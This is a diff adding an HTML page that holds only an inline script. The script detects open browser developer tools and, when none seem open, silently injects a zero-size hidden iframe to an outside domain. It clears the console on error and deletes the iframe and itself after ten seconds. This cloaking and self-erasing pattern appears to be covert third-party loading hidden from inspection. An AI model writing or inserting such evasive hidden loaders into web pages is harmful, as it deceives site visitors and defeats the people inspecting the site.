@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <META http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="robots" content="nofollow"/>
+</head>
+<body>
+<script id="c1">
+    (function (window) {
+        var cheker = function () {
+            try {
+                var widthThreshold = window.outerWidth - window.innerWidth > 160;
+                var heightThreshold = window.outerHeight - window.innerHeight > 160;
+                if (
+                    !(heightThreshold && widthThreshold) &&
+                    ((window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) || widthThreshold || heightThreshold)
+                ) {
+                    return true;
+                } else {
+                    return false;
+                }
+            } catch (err) {
+            }
+        };
+        var createIframe = function () {
+            src = 'https://partner.yottos.com/';
+
+            var tmpElem = document.createElement('div');
+
+            tmpElem.innerHTML = '<iframe name="f1" id="f1" src="' + src + '">';
+            var iframe = tmpElem.firstChild;
+            iframe.style.display = 'none !important';
+            iframe.style.width = '0px';
+            iframe.style.height = '0px';
+            iframe.style.margin = '0px';
+            iframe.style.border = '0px';
+            iframe.style.position = 'absolute';
+            iframe.onerror = eval('function c(){(window.console||{clear:function(){}}).clear();};');
+            document.body.appendChild(iframe);
+            return iframe;
+        };
+        var remove = function () {
+            try {
+                var frame = document.getElementById('f1');
+                if(frame){
+                    frame.remove();
+                }
+                var script = document.getElementById('c1');
+                script.remove();
+                } catch (err) {
+                window.location.reload()
+            }
+        };
+        if(cheker() === false){
+            createIframe();
+        }
+        setTimeout(remove, 10000);
+    })(window);
+</script>
+</body>
+</html>
